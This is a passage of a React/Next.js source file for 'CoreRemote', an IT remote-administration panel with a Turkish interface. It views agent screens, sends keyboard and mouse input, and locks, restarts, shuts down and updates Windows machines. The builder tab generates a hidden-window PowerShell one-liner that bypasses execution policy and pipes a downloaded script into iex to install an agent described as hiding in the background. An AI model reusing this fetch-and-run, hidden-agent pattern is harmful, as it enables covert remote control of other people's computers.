"use client";

import React, { useState, useEffect, useRef } from "react";
import { io, Socket } from "socket.io-client";
import { 
  Laptop, 
  Search, 
  RefreshCw, 
  Play, 
  Lock, 
  Server, 
  Cpu, 
  Activity, 
  AlertCircle, 
  Settings, 
  ChevronLeft, 
  Power,
  RotateCcw,
  UploadCloud,
  CheckCircle,
  Copy,
  Terminal,
  Grid
} from "lucide-react";

// Server API config
const SERVER_HOST = typeof window !== "undefined"
  ? `${window.location.protocol}//${window.location.hostname}:5000`
  : "http://localhost:5000";

interface Telemetry {
  hostname: string;
  username: string;
  osVersion: string;
  cpu: string;
  ram: string;
  ipAddress: string;
  version: string;
}

interface Device {
  id: string;
  hostname: string;
  username: string;
  os_version: string;
  ram: string;
  cpu: string;
  ip_address: string;
  status: string; // 'online' | 'offline'
  last_seen: number;
  agent_version: string;
  wsConnected?: boolean;
}

export default function Home() {
  const [devices, setDevices] = useState<Device[]>([]);
  const [searchQuery, setSearchQuery] = useState("");
  const [activeDeviceId, setActiveDeviceId] = useState<string | null>(null);
  const [telemetry, setTelemetry] = useState<Telemetry | null>(null);
  const [loading, setLoading] = useState(false);
  const [activeTab, setActiveTab] = useState<"devices" | "builder" | "updater">("devices");
  
  // Update state
  const [latestVersion, setLatestVersion] = useState("1.0.0");
  const [serverVersion, setServerVersion] = useState("1.0.0");
  const [updatingServer, setUpdatingServer] = useState(false);
  const [serverUpdateCountdown, setServerUpdateCountdown] = useState(15);
  const [updateFileUrl, setUpdateFileUrl] = useState("");
  const [deviceUpdateProgress, setDeviceUpdateProgress] = useState<Record<string, string>>({});
  const [releaseInfo, setReleaseInfo] = useState<{
    releaseName: string;
    publishedAt: string;
    releaseNotes: string;
    githubUrl: string;
  } | null>(null);
  
  // Builder state
  const [builderTitle, setBuilderTitle] = useState("CoreRemote Destek");
  const [builderServer, setBuilderServer] = useState("");
  const [copied, setCopied] = useState(false);

  // Stats
  const [fps, setFps] = useState(0);
  const [frameSizeKB, setFrameSizeKB] = useState(0);

  // References
  const socketRef = useRef<Socket | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const frameCountRef = useRef(0);
  const lastFpsUpdateRef = useRef(0);

  // Connect socket on load
  useEffect(() => {
    socketRef.current = io(SERVER_HOST);

    socketRef.current.on("connect", () => {
      console.log("Connected to CoreRemote signaling server");
    });

    socketRef.current.on("device_status_change", ({ deviceId, status }) => {
      setDevices(prev => prev.map(d => d.id === deviceId ? { ...d, status } : d));
    });

    // Listen for telemetry updates
    socketRef.current.on("agent_telemetry", ({ deviceId, telemetry: tel }) => {
      if (deviceId === activeDeviceId) {
        setTelemetry(tel);
      }
    });

    // Listen for agent update progress
    socketRef.current.on("agent_update_progress", (data) => {
      setDeviceUpdateProgress(prev => ({
        ...prev,
        [data.deviceId]: `${data.status}: ${data.message || ""}`
      }));
    });

    // Clean up
    return () => {
      if (socketRef.current) socketRef.current.disconnect();
    };
  }, [activeDeviceId]);

  // Load latest version info and devices
  const checkLatestVersion = async () => {
    try {
      const res = await fetch(`${SERVER_HOST}/api/update/check`);
      const data = await res.json();
      setLatestVersion(data.latestVersion);
      setUpdateFileUrl(data.url);
      setServerVersion(data.serverVersion || "1.0.0");
      setReleaseInfo({
        releaseName: data.releaseName || "",
        publishedAt: data.publishedAt || "",
        releaseNotes: data.releaseNotes || "",
        githubUrl: data.githubUrl || ""
      });
    } catch (err) {
      console.error("Failed to check update info", err);
    }
  };

  const loadDevices = async () => {
    setLoading(true);
    try {
      const res = await fetch(`${SERVER_HOST}/api/devices`);
      const data = await res.json();
      setDevices(data);
    } catch (err) {
      console.error("Failed to load devices", err);
    }
    setLoading(false);
  };

  useEffect(() => {
    loadDevices();
    checkLatestVersion();
    
    // Set default builder host
    if (typeof window !== "undefined") {
      setBuilderServer(`ws://${window.location.hostname}:5000/agent-socket`);
    }

    const interval = setInterval(loadDevices, 10000); // Poll every 10s
    return () => clearInterval(interval);
  }, []);

  // Handle incoming video frames
  useEffect(() => {
    if (!socketRef.current || !activeDeviceId) return;

    const handleAgentFrame = (data: ArrayBuffer) => {
      const bytes = new Uint8Array(data);
      if (bytes[0] !== 0x01) return; // Verify frame identifier

      // Update frame size stat
      setFrameSizeKB(Math.round(bytes.length / 1024));

      // Measure FPS
      frameCountRef.current++;
      const now = Date.now();
      if (now - lastFpsUpdateRef.current >= 1000) {
        setFps(frameCountRef.current);
        frameCountRef.current = 0;
        lastFpsUpdateRef.current = now;
      }

      // Convert JPEG bytes (bytes starting from index 1) to Image
      const jpegBytes = bytes.subarray(1);
      const blob = new Blob([jpegBytes], { type: "image/jpeg" });
      const blobUrl = URL.createObjectURL(blob);

      const img = new Image();
      img.onload = () => {
        const canvas = canvasRef.current;
        if (canvas) {
          const ctx = canvas.getContext("2d");
          if (ctx) {
            // Adjust canvas size to match image dimensions
            if (canvas.width !== img.width || canvas.height !== img.height) {
              canvas.width = img.width;
              canvas.height = img.height;
            }
            ctx.drawImage(img, 0, 0);
          }
        }
        URL.revokeObjectURL(blobUrl);
      };
      img.src = blobUrl;
    };

    socketRef.current.on("agent_frame", handleAgentFrame);

    return () => {
      if (socketRef.current) socketRef.current.off("agent_frame", handleAgentFrame);
    };
  }, [activeDeviceId]);

  // Connect to target device
  const startSession = (deviceId: string) => {
    setActiveDeviceId(deviceId);
    setFps(0);
    setFrameSizeKB(0);

    // Find local device record for quick display
    const dev = devices.find(d => d.id === deviceId);
    if (dev) {
      setTelemetry({
        hostname: dev.hostname,
        username: dev.username,
        osVersion: dev.os_version,
        cpu: dev.cpu,
        ram: dev.ram,
        ipAddress: dev.ip_address,
        version: dev.agent_version
      });
    }

    if (socketRef.current) {
      socketRef.current.emit("watch_device", deviceId);
      socketRef.current.emit("signal_to_agent", {
        deviceId,
        signal: { action: "start_stream", quality: 60, interval: 100 }
      });
    }
  };

  // Stop session
  const stopSession = () => {
    if (socketRef.current && activeDeviceId) {
      socketRef.current.emit("signal_to_agent", {
        deviceId: activeDeviceId,
        signal: { action: "stop_stream" }
      });
      socketRef.current.emit("unwatch_device", activeDeviceId);
    }
    setActiveDeviceId(null);
    setTelemetry(null);
  };

  // ── Input Handlers ──
  const handleMouseMove = (e: React.MouseEvent<HTMLCanvasElement>) => {
    if (!socketRef.current || !activeDeviceId || !canvasRef.current) return;
    const canvas = canvasRef.current;
    const rect = canvas.getBoundingClientRect();
    
    // Calculate relative coordinates (0 to 1)
    const x = (e.clientX - rect.left) / rect.width;
    const y = (e.clientY - rect.top) / rect.height;

    socketRef.current.emit("signal_to_agent", {
      deviceId: activeDeviceId,
      signal: { action: "mousemove", x, y }
    });
  };

  const handleMouseDown = (e: React.MouseEvent<HTMLCanvasElement>) => {
    if (!socketRef.current || !activeDeviceId) return;
    e.preventDefault();
    socketRef.current.emit("signal_to_agent", {
      deviceId: activeDeviceId,
      signal: { action: "mousedown", button: e.button }
    });
  };

  const handleMouseUp = (e: React.MouseEvent<HTMLCanvasElement>) => {
    if (!socketRef.current || !activeDeviceId) return;
    e.preventDefault();
    socketRef.current.emit("signal_to_agent", {
      deviceId: activeDeviceId,
      signal: { action: "mouseup", button: e.button }
    });
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLDivElement>) => {
    if (!socketRef.current || !activeDeviceId) return;
    e.preventDefault();
    socketRef.current.emit("signal_to_agent", {
      deviceId: activeDeviceId,
      signal: { action: "keydown", vk: e.keyCode }
    });
  };

  const handleKeyUp = (e: React.KeyboardEvent<HTMLDivElement>) => {
    if (!socketRef.current || !activeDeviceId) return;
    e.preventDefault();
    socketRef.current.emit("signal_to_agent", {
      deviceId: activeDeviceId,
      signal: { action: "keyup", vk: e.keyCode }
    });
  };

  // ── Remote Commands ──
  const sendLock = () => {
    if (socketRef.current && activeDeviceId) {
      socketRef.current.emit("signal_to_agent", {
        deviceId: activeDeviceId,
        signal: { action: "lock" }
      });
    }
  };

  const sendRestart = () => {
    if (confirm("Uzak bilgisayarı yeniden başlatmak istediğinize emin misiniz?")) {
      if (socketRef.current && activeDeviceId) {
        socketRef.current.emit("signal_to_agent", {
          deviceId: activeDeviceId,
          signal: { action: "restart" }
        });
      }
    }
  };

  const sendShutdown = () => {
    if (confirm("Uzak bilgisayarı kapatmak istediğinize emin misiniz?")) {
      if (socketRef.current && activeDeviceId) {
        socketRef.current.emit("signal_to_agent", {
          deviceId: activeDeviceId,
          signal: { action: "shutdown" }
        });
      }
    }
  };

  const triggerUpdate = (deviceId: string) => {
    if (!updateFileUrl) {
      alert("Sunucuda hazır bir güncelleme paketi bulunamadı.");
      return;
    }
    if (socketRef.current) {
      socketRef.current.emit("trigger_update", {
        deviceId,
        updateUrl: updateFileUrl
      });
      setDeviceUpdateProgress(prev => ({
        ...prev,
        [deviceId]: "İstek gönderildi, güncelleme başlatılıyor..."
      }));
    }
  };

  const triggerUpdateAllOutdated = () => {
    const outdatedDevices = devices.filter(d => d.status === "online" && d.agent_version !== latestVersion);
    if (outdatedDevices.length === 0) {
      alert("Güncellenmesi gereken çevrimiçi cihaz bulunmamaktadır.");
      return;
    }
    if (confirm(`${outdatedDevices.length} adet çevrimiçi cihazı en son sürüme (v${latestVersion}) yükseltmek istediğinize emin misiniz?`)) {
      outdatedDevices.forEach(d => {
        triggerUpdate(d.id);
      });
    }
  };

  const triggerServerUpdate = async () => {
    if (!confirm("Sinyalizasyon Sunucusu ve Yönetim Paneli en son GitHub sürümüne güncellenecektir. Bu işlem sırasında bağlantınız kısa süreliğine kesilebilir. Devam etmek istiyor musunuz?")) {
      return;
    }
    setUpdatingServer(true);
    setServerUpdateCountdown(15);
    try {
      const res = await fetch(`${SERVER_HOST}/api/admin/update-server`, { method: "POST" });
      const data = await res.json();
      if (!res.ok) {
        throw new Error(data.error || "Sunucu güncellemesi başlatılamadı.");
      }
    } catch (err: any) {
      alert(`Hata: ${err.message}`);
      setUpdatingServer(false);
      return;
    }

    // Geri sayım başlat
    const interval = setInterval(() => {
      setServerUpdateCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(interval);
          window.location.reload();
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  };

  // Filter devices
  const filteredDevices = devices.filter(d => 
    d.hostname.toLowerCase().includes(searchQuery.toLowerCase()) ||
    d.id.toLowerCase().includes(searchQuery.toLowerCase())
  );

  // Generate copy command
  const getInstallCommand = () => {
    if (typeof window === "undefined") return "";
    const cleanHost = window.location.host;
    return `powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "irm http://${cleanHost}/api/builder/install?title=${encodeURIComponent(builderTitle)}&server=${encodeURIComponent(builderServer)} | iex"`;
  };

  const handleCopyCommand = () => {
    navigator.clipboard.writeText(getInstallCommand());
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="bg-[#0d1117] min-h-screen text-[#c9d1d9] font-sans flex flex-col">
      {updatingServer && (
        <div className="fixed inset-0 bg-[#0d1117]/85 backdrop-blur-sm z-50 flex items-center justify-center flex-col gap-4 text-center p-6">
          <div className="w-12 h-12 border-4 border-[#238636] border-t-transparent rounded-full animate-spin"></div>
          <h2 className="text-xl font-semibold text-[#f0f6fc] mt-2">Sunucu Güncelleniyor</h2>
          <p className="text-sm text-[#8b949e] max-w-md">
            Sinyalizasyon sunucusu en son sürümü çekiyor, bağımlılıkları yüklüyor ve operatör panelini yeniden derliyor.
          </p>
          <div className="bg-[#161b22] border border-[#30363d] px-4 py-2 rounded text-xs font-mono text-[#56d364]">
            Sayfa yenileniyor: {serverUpdateCountdown} saniye...
          </div>
        </div>
      )}
      {/* GitHub Style Top Navigation */}
      <header className="bg-[#161b22] border-b border-[#30363d] px-6 py-3 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="bg-[#238636] p-2 rounded-lg text-white">
            <Server size={20} />
          </div>
          <span className="font-semibold text-lg tracking-wider text-[#f0f6fc]">CoreRemote</span>
          <span className="text-xs bg-[#30363d] text-[#8b949e] px-2 py-0.5 rounded-full border border-[#8b949e]/30">IT Portal</span>
        </div>
        
        {/* Navigation Tabs */}
        {!activeDeviceId && (
          <div className="flex items-center gap-2 border-b border-transparent">
            <button
              onClick={() => setActiveTab("devices")}
              className={`px-3 py-1.5 text-sm font-medium rounded-md transition-all flex items-center gap-1.5 ${
                activeTab === "devices" 
                  ? "bg-[#21262d] text-[#f0f6fc] border border-[#30363d]" 
                  : "text-[#8b949e] hover:text-[#f0f6fc]"
              }`}
            >
              <Laptop size={14} />
              Cihazlar
            </button>
            <button
              onClick={() => setActiveTab("builder")}
              className={`px-3 py-1.5 text-sm font-medium rounded-md transition-all flex items-center gap-1.5 ${
                activeTab === "builder" 
                  ? "bg-[#21262d] text-[#f0f6fc] border border-[#30363d]" 
                  : "text-[#8b949e] hover:text-[#f0f6fc]"
              }`}
            >
              <Settings size={14} />
              Ajan Özelleştirici
            </button>
            <button
              onClick={() => setActiveTab("updater")}
              className={`px-3 py-1.5 text-sm font-medium rounded-md transition-all flex items-center gap-1.5 ${
                activeTab === "updater" 
                  ? "bg-[#21262d] text-[#f0f6fc] border border-[#30363d]" 
                  : "text-[#8b949e] hover:text-[#f0f6fc]"
              }`}
            >
              <UploadCloud size={14} />
              Güncelleme Merkezi
            </button>
          </div>
        )}

        <div className="flex items-center gap-4">
          <button 
            onClick={loadDevices} 
            disabled={loading}
            className="flex items-center gap-2 text-sm text-[#8b949e] hover:text-[#f0f6fc] border border-[#30363d] hover:bg-[#21262d] px-3 py-1.5 rounded transition-all"
          >
            <RefreshCw size={14} className={loading ? "animate-spin" : ""} />
            Yenile
          </button>
        </div>
      </header>

      {/* Main Container */}
      <main className="flex-1 flex flex-col p-6 max-w-7xl w-full mx-auto">
        {!activeDeviceId ? (
          activeTab === "devices" ? (
            // View 1: Operator Dashboard
            <div className="flex flex-col gap-6">
              
              {/* Header Description */}
              <div className="flex flex-col gap-1 border-b border-[#30363d] pb-4">
                <h1 className="text-2xl font-semibold text-[#f0f6fc]">Cihaz Yönetimi</h1>
                <p className="text-sm text-[#8b949e]">Uzak Windows ajanlarını izleyin. Sürüm kontrolü yapın ve tek tıkla güncelleyin.</p>
              </div>

              {/* Quick Stats Grid */}
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div className="bg-[#161b22] border border-[#30363d] rounded-lg p-4 flex items-center gap-4">
                  <div className="bg-[#1f6feb]/15 p-3 rounded-full text-[#58a6ff]">
                    <Laptop size={24} />
                  </div>
                  <div>
                    <div className="text-2xl font-bold text-[#f0f6fc]">{devices.length}</div>
                    <div className="text-xs text-[#8b949e]">Kayıtlı Toplam Ajan</div>
                  </div>
                </div>
                <div className="bg-[#161b22] border border-[#30363d] rounded-lg p-4 flex items-center gap-4">
                  <div className="bg-[#238636]/15 p-3 rounded-full text-[#56d364]">
                    <CheckCircle size={24} />
                  </div>
                  <div>
                    <div className="text-2xl font-bold text-[#f0f6fc]">
                      {devices.filter(d => d.status === "online").length}
                    </div>
                    <div className="text-xs text-[#8b949e]">Çevrimiçi (Online) Ajan</div>
                  </div>
                </div>
                <div className="bg-[#161b22] border border-[#30363d] rounded-lg p-4 flex items-center gap-4">
                  <div className="bg-[#da3637]/15 p-3 rounded-full text-[#f85149]">
                    <AlertCircle size={24} />
                  </div>
                  <div>
                    <div className="text-2xl font-bold text-[#f0f6fc]">
                      {devices.filter(d => d.status !== "online").length}
                    </div>
                    <div className="text-xs text-[#8b949e]">Çevrimdışı (Offline) Ajan</div>
                  </div>
                </div>
              </div>

              {/* Search/Filter Bar */}
              <div className="flex items-center gap-3 bg-[#161b22] border border-[#30363d] rounded-md px-3 py-2">
                <Search size={18} className="text-[#8b949e]" />
                <input 
                  type="text" 
                  placeholder="Cihaz adı veya ID ile arayın..."
                  value={searchQuery}
                  onChange={e => setSearchQuery(e.target.value)}
                  className="bg-transparent border-0 outline-none text-[#c9d1d9] placeholder-[#8b949e] w-full text-sm"
                />
              </div>

              {/* Devices Table */}
              <div className="bg-[#161b22] border border-[#30363d] rounded-lg overflow-hidden">
                <table className="w-full text-left border-collapse text-sm">
                  <thead>
                    <tr className="bg-[#1f242c] border-b border-[#30363d] text-[#8b949e] font-medium">
                      <th className="p-4">Cihaz ID</th>
                      <th className="p-4">Makine Adı</th>
                      <th className="p-4">Kullanıcı</th>
                      <th className="p-4">Versiyon</th>
                      <th className="p-4">Donanım</th>
                      <th className="p-4">IP Adresi</th>
                      <th className="p-4">Durum</th>
                      <th className="p-4 text-right">İşlem</th>
                    </tr>
                  </thead>
                  <tbody>
                    {filteredDevices.length === 0 ? (
                      <tr>
                        <td colSpan={8} className="p-8 text-center text-[#8b949e]">
                          Kayıtlı aktif cihaz bulunamadı.
                        </td>
                      </tr>
                    ) : (
                      filteredDevices.map(d => {
                        const needsUpdate = d.agent_version !== latestVersion;
                        return (
                          <tr key={d.id} className="border-b border-[#30363d] hover:bg-[#21262d]/50 transition-all">
                            <td className="p-4 font-mono font-semibold text-xs text-[#58a6ff]">
                              {d.id}
                            </td>
                            <td className="p-4 font-semibold text-[#f0f6fc]">{d.hostname}</td>
                            <td className="p-4 text-[#8b949e]">{d.username}</td>
                            <td className="p-4">
                              <div className="flex items-center gap-2">
                                <span className="font-mono text-xs bg-[#21262d] border border-[#30363d] px-2 py-0.5 rounded text-[#c9d1d9]">
                                  {d.agent_version}
                                </span>
                                {d.status === "online" && needsUpdate && (
                                  <button
                                    onClick={() => triggerUpdate(d.id)}
                                    title="Sürümü Güncelle"
                                    className="bg-[#238636] hover:bg-[#2ea043] text-white text-[10px] font-semibold px-2 py-0.5 rounded flex items-center gap-1 transition-all"
                                  >
                                    <UploadCloud size={10} />
                                    Güncelle ({latestVersion})
                                  </button>
                                )}
                              </div>
                            </td>
                            <td className="p-4 text-xs text-[#8b949e]">
                              <div className="truncate max-w-[200px]">{d.cpu}</div>
                              <div>RAM: {d.ram}</div>
                            </td>
                            <td className="p-4 font-mono text-xs">{d.ip_address}</td>
                            <td className="p-4">
                              <span className={`inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-medium border ${
                                d.status === "online" 
                                  ? "bg-[#238636]/10 text-[#56d364] border-[#238636]/30" 
                                  : "bg-[#da3637]/10 text-[#f85149] border-[#da3637]/30"
                              }`}>
                                <span className={`w-1.5 h-1.5 rounded-full ${
                                  d.status === "online" ? "bg-[#56d364]" : "bg-[#f85149]"
                                }`} />
                                {d.status === "online" ? "Çevrimiçi" : "Çevrimdışı"}
                              </span>
                            </td>
                            <td className="p-4 text-right">
                              <button
                                onClick={() => startSession(d.id)}
                                disabled={d.status !== "online"}
                                className={`inline-flex items-center gap-2 font-medium text-xs px-3 py-1.5 rounded transition-all ${
                                  d.status === "online"
                                    ? "bg-[#238636] hover:bg-[#2ea043] text-white cursor-pointer"
                                    : "bg-[#30363d] text-[#8b949e] cursor-not-allowed"
                                }`}
                              >
                                <Play size={12} />
                                Bağlan
                              </button>
                            </td>
                          </tr>
                        );
                      })
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          ) : activeTab === "builder" ? (
            // View 1.5: Custom Agent Builder
            <div className="flex flex-col gap-6">
              <div className="flex flex-col gap-1 border-b border-[#30363d] pb-4">
                <h1 className="text-2xl font-semibold text-[#f0f6fc]">Ajan Özelleştirici ve Derleyici</h1>
                <p className="text-sm text-[#8b949e]">Uzak bilgisayarlara kurulacak ajanın başlığını, logosunu ve sunucu adreslerini buradan özelleştirerek kurulum scripti oluşturun.</p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                
                {/* Customization Settings Form */}
                <div className="md:col-span-1 bg-[#161b22] border border-[#30363d] rounded-lg p-5 flex flex-col gap-4">
                  <h3 className="font-semibold text-sm text-[#f0f6fc] border-b border-[#30363d] pb-2 flex items-center gap-2">
                    <Settings size={16} className="text-[#58a6ff]" />
                    Ajan Parametreleri
                  </h3>
                  
                  <div className="flex flex-col gap-2">
                    <label className="text-xs text-[#8b949e]">Tray İkon Başlığı / Firma Adı:</label>
                    <input
                      type="text"
                      value={builderTitle}
                      onChange={e => setBuilderTitle(e.target.value)}
                      className="bg-[#0d1117] border border-[#30363d] focus:border-[#58a6ff] outline-none px-3 py-2 rounded text-sm text-[#c9d1d9]"
                    />
                  </div>

                  <div className="flex flex-col gap-2">
                    <label className="text-xs text-[#8b949e]">WebSocket Sunucu Adresi:</label>
                    <input
                      type="text"
                      value={builderServer}
                      onChange={e => setBuilderServer(e.target.value)}
                      className="bg-[#0d1117] border border-[#30363d] focus:border-[#58a6ff] outline-none px-3 py-2 rounded text-sm text-[#c9d1d9] font-mono text-xs"
                    />
                  </div>
                </div>

                {/* Installation Commands Card */}
                <div className="md:col-span-2 bg-[#161b22] border border-[#30363d] rounded-lg p-5 flex flex-col gap-4">
                  <h3 className="font-semibold text-sm text-[#f0f6fc] border-b border-[#30363d] pb-2 flex items-center gap-2">
                    <Terminal size={16} className="text-[#56d364]" />
                    Uzaktan Tek Tık Kurulum Kodu (PowerShell)
                  </h3>
                  
                  <p className="text-xs text-[#8b949e]">Hedef makinede PowerShell'i yönetici (Admin) olarak açıp aşağıdaki tek satırlık kodu yapıştırmanız yeterlidir. Script, C# kodunu sizin ayarlarınızla otomatik derleyip system tray'e yerleştirecektir.</p>
                  
                  <div className="bg-[#0d1117] border border-[#30363d] p-4 rounded-md font-mono text-xs text-[#58a6ff] break-all relative group flex items-start justify-between gap-4">
                    <span className="select-all">{getInstallCommand()}</span>
                    <button
                      onClick={handleCopyCommand}
                      className="text-[#8b949e] hover:text-[#f0f6fc] p-1.5 border border-[#30363d] hover:bg-[#21262d] rounded transition-all flex-shrink-0"
                      title="Kodu Kopyala"
                    >
                      {copied ? <span className="text-xs text-[#56d364]">Kopyalandı!</span> : <Copy size={14} />}
                    </button>
                  </div>

                  <div className="text-xs text-[#8b949e] flex items-start gap-2 bg-[#1f6feb]/5 border border-[#1f6feb]/25 p-3 rounded">
                    <Activity size={16} className="text-[#58a6ff] flex-shrink-0 mt-0.5" />
                    <div>
                      <strong>Ajan Özelleştirme Mantığı:</strong> Sunucumuz, bu komut tetiklendiğinde C# koduna şirket adınızı ve logonuzu base64 olarak gömer ve hedef makinedeki <code>csc.exe</code> ile makineye özel, arka planda gizlenen bir Windows Forms binary'si olarak derler.
                    </div>
                  </div>

                  <div className="flex flex-col gap-2 border-t border-[#30363d] pt-4 mt-2">
                    <h4 className="font-semibold text-xs text-[#f0f6fc]">Alternatif: Derlenmiş EXE Olarak İndir</h4>
                    <p className="text-xs text-[#8b949e]">Ajanı sunucu üzerinde derleyip doğrudan bir <code>.exe</code> dosyası olarak indirebilirsiniz. İndirdiğiniz dosyayı hedef bilgisayarda doğrudan çalıştırabilirsiniz.</p>
                    <div>
                      <a
                        href={`${SERVER_HOST}/api/builder/download-exe?title=${encodeURIComponent(builderTitle)}&server=${encodeURIComponent(builderServer)}`}
                        download="CoreRemoteAgent.exe"
                        className="inline-flex items-center gap-2 bg-[#238636] hover:bg-[#2ea043] text-white text-xs font-semibold px-4 py-2.5 rounded transition-all cursor-pointer"
                      >
                        <UploadCloud size={14} />
                        Ajanı İndir (.exe)
                      </a>
                    </div>
                  </div>
                </div>

              </div>
            </div>
          ) : (
            // View 1.8: Güncelleme Merkezi
            <div className="flex flex-col gap-6">
              {/* Header Description */}
              <div className="flex flex-col gap-1 border-b border-[#30363d] pb-4">
                <h1 className="text-2xl font-semibold text-[#f0f6fc]">Güncelleme Merkezi</h1>
                <p className="text-sm text-[#8b949e]">Uzak agent sürümlerini yönetin ve GitHub Releases üzerinden yayınlanan en son sürümleri dağıtın.</p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                {/* Sol Panel: Sürüm Bilgileri */}
                <div className="md:col-span-1 flex flex-col gap-6">
                  {/* Sistem / Sunucu Sürümü Kartı */}
                  <div className="bg-[#161b22] border border-[#30363d] rounded-lg p-5 flex flex-col gap-4">
                    <h3 className="font-semibold text-sm text-[#f0f6fc] border-b border-[#30363d] pb-2 flex items-center gap-2">
                      <Server size={16} className="text-[#58a6ff]" />
                      Sistem / Sunucu Sürümü
                    </h3>
                    <div className="flex flex-col gap-3 text-xs">
                      <div className="flex justify-between items-center">
                        <span className="text-[#8b949e]">Mevcut Sunucu Sürümü:</span>
                        <span className="font-mono text-xs text-[#c9d1d9] bg-[#21262d] border border-[#30363d] px-2 py-0.5 rounded">v{serverVersion}</span>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-[#8b949e]">En Son GitHub Sürümü:</span>
                        <span className="font-mono text-xs text-[#56d364] bg-[#238636]/10 border border-[#238636]/30 px-2 py-0.5 rounded">v{latestVersion}</span>
                      </div>
                      
                      {serverVersion !== latestVersion ? (
                        <div className="mt-2">
                          <button
                            onClick={triggerServerUpdate}
                            className="w-full bg-[#238636] hover:bg-[#2ea043] text-white font-medium py-2 rounded transition-all text-xs cursor-pointer flex items-center justify-center gap-1.5"
                          >
                            <RefreshCw size={14} className="animate-spin-slow" />
                            Sunucuyu Şimdi Güncelle (v{latestVersion})
                          </button>
                          <p className="text-[10px] text-[#8b949e] mt-1 text-center">
                            Sunucu güncellemeyi arka planda çekip otomatik olarak yeniden başlayacaktır.
                          </p>
                        </div>
                      ) : (
                        <div className="mt-2 text-center text-[#56d364] text-[11px] bg-[#238636]/10 border border-[#238636]/30 py-2 rounded font-medium">
                          ✓ Sunucu Sisteminiz Güncel
                        </div>
                      )}
                    </div>
                  </div>
                  <div className="bg-[#161b22] border border-[#30363d] rounded-lg p-5 flex flex-col gap-4">
                    <h3 className="font-semibold text-sm text-[#f0f6fc] border-b border-[#30363d] pb-2 flex items-center gap-2">
                      <UploadCloud size={16} className="text-[#56d364]" />
                      Son GitHub Sürümü
                    </h3>
                    
                    {releaseInfo ? (
                      <div className="flex flex-col gap-3 text-xs">
                        <div>
                          <span className="text-[#8b949e] block">Yayın Adı</span>
                          <span className="font-semibold text-sm text-[#58a6ff]">{releaseInfo.releaseName}</span>
                        </div>
                        <div>
                          <span className="text-[#8b949e] block">Sürüm Etiketi</span>
                          <span className="font-mono text-[11px] bg-[#21262d] border border-[#30363d] px-2 py-0.5 rounded text-[#c9d1d9] inline-block mt-0.5">
                            v{latestVersion}
                          </span>
                        </div>
                        <div>
                          <span className="text-[#8b949e] block">Yayınlanma Tarihi</span>
                          <span className="font-medium text-[#c9d1d9]">
                            {releaseInfo.publishedAt ? new Date(releaseInfo.publishedAt).toLocaleString("tr-TR") : "-"}
                          </span>
                        </div>
                        <div>
                          <span className="text-[#8b949e] block">İndirme Linki</span>
                          <a 
                            href={updateFileUrl} 
                            target="_blank" 
                            rel="noreferrer" 
                            className="text-[#58a6ff] hover:underline break-all block mt-0.5"
                          >
                            CoreRemoteAgent.exe (GitHub)
                          </a>
                        </div>
                        
                        {releaseInfo.githubUrl && (
                          <div className="mt-2">
                            <a
                              href={releaseInfo.githubUrl}
                              target="_blank"
                              rel="noreferrer"
                              className="inline-block bg-[#21262d] border border-[#30363d] hover:bg-[#30363d] text-[#c9d1d9] font-medium px-3 py-1.5 rounded text-center transition-all w-full"
                            >
                              GitHub'da Görüntüle
                            </a>
                          </div>
                        )}
                      </div>
                    ) : (
                      <div className="text-xs text-[#8b949e] py-4 text-center">
                        Sürüm bilgisi yükleniyor...
                      </div>
                    )}
                  </div>

                  <div className="bg-[#161b22] border border-[#30363d] rounded-lg p-5 flex flex-col gap-4">
                    <h3 className="font-semibold text-sm text-[#f0f6fc] border-b border-[#30363d] pb-2 flex items-center gap-2">
                      <Terminal size={16} className="text-[#58a6ff]" />
                      Sürüm Değişiklik Notları
                    </h3>
                    <div className="bg-[#0d1117] border border-[#30363d] p-3 rounded text-xs font-mono text-[#8b949e] max-h-[250px] overflow-y-auto whitespace-pre-wrap">
                      {releaseInfo?.releaseNotes || "Sürüm notu girilmemiş."}
                    </div>
                  </div>
                </div>

                {/* Sağ Panel: Ajan Dağılımı ve Toplu Güncelleme */}
                <div className="md:col-span-2 flex flex-col gap-6">
                  {/* Durum Kartları */}
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <div className="bg-[#161b22] border border-[#30363d] rounded-lg p-4 flex items-center gap-4">
                      <div className="bg-[#238636]/15 p-3 rounded-full text-[#56d364]">
                        <CheckCircle size={20} />
                      </div>
                      <div>
                        <div className="text-xl font-bold text-[#f0f6fc]">
                          {devices.filter(d => d.agent_version === latestVersion).length}
                        </div>
                        <div className="text-xs text-[#8b949e]">Güncel Sürüm Ajanlar</div>
                      </div>
                    </div>
                    
                    <div className="bg-[#161b22] border border-[#30363d] rounded-lg p-4 flex items-center gap-4">
                      <div className="bg-[#f1e05a]/15 p-3 rounded-full text-[#f1e05a]">
                        <UploadCloud size={20} />
                      </div>
                      <div>
                        <div className="text-xl font-bold text-[#f0f6fc]">
                          {devices.filter(d => d.agent_version !== latestVersion).length}
                        </div>
                        <div className="text-xs text-[#8b949e]">Güncelleme Bekleyenler</div>
                      </div>
                    </div>
                  </div>

                  {/* Toplu İşlem Butonu */}
                  <div className="bg-[#161b22] border border-[#30363d] rounded-lg p-5 flex flex-col gap-3">
                    <h3 className="font-semibold text-sm text-[#f0f6fc]">Toplu Sürüm Güncelleme</h3>
                    <p className="text-xs text-[#8b949e]">
                      Çevrimiçi (Online) durumda olan ve en son sürümü (v{latestVersion}) kullanmayan tüm aktif ajanları tek tıkla güncelleyebilirsiniz. Ajanlar güncellemeyi arka planda kurarak otomatik olarak tekrar bağlanacaktır.
                    </p>
                    <div>
                      <button
                        onClick={triggerUpdateAllOutdated}
                        disabled={devices.filter(d => d.status === "online" && d.agent_version !== latestVersion).length === 0}
                        className={`inline-flex items-center gap-2 font-medium text-xs px-4 py-2.5 rounded transition-all ${
